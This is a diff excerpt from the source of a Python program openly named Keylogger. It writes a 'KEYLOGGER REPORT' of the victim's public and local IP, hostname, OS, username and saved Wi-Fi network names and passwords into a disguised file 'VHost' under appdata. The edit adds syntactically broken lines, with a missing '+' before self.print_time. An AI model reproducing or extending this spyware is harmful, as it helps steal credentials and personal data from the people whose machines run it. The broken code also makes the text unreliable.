@@ -236,13 +236,13 @@ class Keylogger:
                             with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
                                   file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                                   +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_info+'\n'+"="*30\
-                                  +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'+print_time+'\n'\
+                                  +'\n'+'Keylogger Start'+'\n'+"="*30+'\n'self.print_time+'\n'\
                                   +print_line+'\n')
              else:            
                     with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
                          file0.write('\n'+'KEYLOGGER REPORT '+'\n'+"="*30+'\n'+print_pub+'\n'+print_local_ip\
                          +'\n'+print_hostname+'\n'+print_os_name+'\n'+print_os_re+'\n'+print_username+'\n'+print_WIFI+print_SSID+print_password\
-                         +print2SSID+print2password+print3SSID+print3password+"="*30+'\n'+'Keylooger Start'+'\n'+"="*30+'\n'+print_time+'\n'\
+                         +print2SSID+print2password+print3SSID+print3password+"="*30+'\n'+'Keylooger Start'+'\n'+"="*30+'\n'+self.print_time+'\n'\
                          +print_line+'\n')                             
       
           
